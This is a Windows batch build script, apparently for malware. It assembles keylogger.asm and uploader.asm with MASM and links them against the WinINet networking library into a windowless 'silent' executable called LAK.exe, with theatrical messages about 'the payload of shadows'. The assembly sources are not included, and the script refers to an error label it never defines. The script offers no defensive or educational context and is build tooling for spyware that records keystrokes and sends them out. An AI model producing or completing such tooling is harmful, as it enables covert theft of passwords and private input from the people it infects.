@echo off
color 0A
timeout /t 1 >nul
echo [*] Assembling the payload of shadows...

:: Assemble keylogger.asm
echo [>] Assembling: keylogger.asm
ml /c /coff /I "C:\masm32\include" keylogger.asm
if errorlevel 1 goto :error

:: Assemble uploader.asm
echo [>] Assembling: uploader.asm
ml /c /coff /I "C:\masm32\include" uploader.asm
if errorlevel 1 goto :error

:: Link all into a silent .exe
echo [>] Linking: Creating silent executable...
link keylogger.obj uploader.obj /SUBSYSTEM:WINDOWS /LIBPATH:C:\masm32\lib wininet.lib kernel32.lib user32.lib
if errorlevel 1 goto :error

echo.
echo [✓] LAK.exe built